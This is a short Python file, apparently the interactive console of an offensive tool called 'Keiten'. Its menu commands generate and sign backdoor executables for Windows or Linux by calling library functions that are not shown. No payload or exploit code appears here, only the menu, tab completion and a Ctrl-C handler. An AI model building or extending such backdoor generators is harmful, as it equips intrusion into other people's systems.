#menu
from lib import generate
from lib import sign
import os, sys, signal, readline, rlcompleter

tabcomp = ['help','exit','clear','generate', 'exe', 'bin']

def completer(text, state):
    options = [x for x in tabcomp if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def help():
    print("\n")
    print("Core Commands")
    print("=============")
    print("")
    print("  Command         Description")
    print("  -------         -----------")
    print("  help            Print out help")
    print("  clear           clear screen")
    print("  generate        generate backdoors (example: generate exe or bin)")
    print("  exit            Quit Keiten")
    print("")

def menu():
    option = input("console (\033[95mmain\033[0m)> ")
    if option[:8] == "generate":
        if option[10:] == None:
            print("Input is required!")
            menu()
        else:
            choice_os = option[9:]
            if choice_os == "bin":
                generate.generate_linux()
                sign.start()
                menu()
            elif choice_os == "exe":
                generate.generate_windows()
                sign.start()
                menu()
            else:
                print("No valid input! exe or bin")
                menu()
    elif option == "clear":
        os.system("clear")
        menu()
    elif option == "help":
        help()
        menu()
    elif option == "exit":
        exit()
    elif option == "about":
        print("about me")
        menu()
    else:
        print("Oops. Try: help")
        menu()

def signal_handler(sig, frame):
    pass

signal.signal(signal.SIGINT, signal_handler)